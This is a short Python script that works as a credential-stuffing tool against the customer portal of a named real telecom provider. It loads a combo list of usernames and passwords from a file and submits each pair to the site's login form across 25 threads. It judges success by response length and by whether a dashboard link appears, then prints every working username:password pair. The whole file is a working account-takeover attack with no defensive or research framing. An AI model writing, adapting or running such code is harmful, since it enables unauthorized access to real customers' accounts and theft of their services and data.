import requests
import threading
import queue
import time
import sys
from bs4 import BeautifulSoup

link = "<li><a href=\"api_hosting.html\" >Hosting</a></li>"


Q = queue.Queue()
sofar = 0
total = 0
def thr():
    while not Q.empty():
        try:
            run()
            time.sleep(1)
        except:
            pass

def run():
    x = Q.get()
    login_data={
        "user":x["user"],
        "pass":x["passwd"],
        "Login": "OK",
        "logintype": "login",
        "pid": "2938",
        "redirect_url":"" ,
        "realm": "sso",
        "application": "portal",
        "userid": "",
        "password": "",
        "korisnickoIme": "",
        "lozinka": "",
        "redirekcija": ""
    }

    s = requests.Session()
    r = s.post("https://www.bhtelecom.ba/korisnicki_portal.html?&no_cache=1",login_data)

    if len(r.content.decode()) > 9000 and len(r.content.decode()) < 10000:
        return False

    r = s.get("https://www.bhtelecom.ba/main_dash.html")
    if len(r.content.decode()) > 9000 and len(r.content.decode()) < 10000:
        return False
    else:
        global sofar,link
        if r.content.decode().find(link) != -1:
            sofar+=1
            print(str(sofar)+"/"+ str(total)+" : "+str(login_data['user'])+":"+str(login_data['pass']))


a = ""
combo = []
with open(sys.argv[1],"r") as f:
    a = f.read()

a= a.split("\n")
for i in a:
    i = i.split("\t")
    i = " ".join(i)
    i = i.split(",")
    i = " ".join(i)
    i = i.split(" ")
    try:
        while True:
            i.remove("")
    except:
        pass
    if len(i)>1:
        Q.put({"user":i[0],"passwd":i[1]})

total = Q.qsize()
sofar = 0
for i in range(25):
    t = threading.Thread(target=thr)
    t.start()

